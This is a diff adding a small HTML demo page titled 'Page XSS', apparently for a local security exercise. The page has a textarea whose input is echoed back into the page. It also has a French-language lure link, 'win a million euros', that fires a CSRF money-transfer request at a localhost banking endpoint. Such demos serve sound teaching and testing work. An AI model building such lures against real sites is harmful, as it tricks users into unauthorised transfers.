@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        Page XSS
+    </head>
+    <body>
+        <hr>
+        <textarea id = text style="width: 300px; height:300px"></textarea>
+        <br>
+        <button id = submit>Submit</button>
+        <div id = "submited_value">
+            
+        </div>
+
+        <!-- utilisation de la page pour une attaque csrf de localhost:3003 -->
+        <a href = "http://localhost:3003/virement/1/2">Gagne 1 million d'euros</a>
+    </body>
+    <script src = "./vendor.bundle.base.js"></script>
+    <script src = "./xss.js"></script>
+</html>
